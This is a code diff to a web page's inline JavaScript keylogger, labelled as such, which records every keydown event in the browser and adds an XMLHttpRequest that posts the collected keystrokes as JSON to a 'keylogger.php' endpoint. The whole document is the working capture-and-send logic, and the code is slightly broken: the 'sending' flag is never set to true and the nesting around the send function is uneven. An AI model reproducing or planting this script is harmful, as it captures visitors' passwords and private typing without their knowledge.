@@ -8,7 +8,7 @@
     <script>
         let kslog = {
             keystore : [], //Keystroke data will be stored here
-
+            sending : false,
             klog : function() {
                 //Listen for & records key strokes & save to array
                 window.addEventListener("keydown", function(event){
@@ -22,12 +22,27 @@
 
                 // Server
 
-                    serve : function() { if (kslog.keystore.length != 0) {
+                    serve : function() { if (!kslog.sending && kslog.keystore.length != 0) {
 
                         let form = new FormData();
+
                         form.append('keys', JSON.stringify(kslog.keystore));
                         
-                        kslog.keystore = []
+                        kslog.keystore = [];
+
+
+
+                // Ajax
+
+                    var req = new XMLHttpRequest(); 
+                    req.open("POST", "keylogger.php");
+                    req.onload = function(){
+                        kslog.sending = false;
+                        
+                        console.log(this.response);
+                    };
+
+                    req.send(form)
                 }}
         };
                                                         // error .init
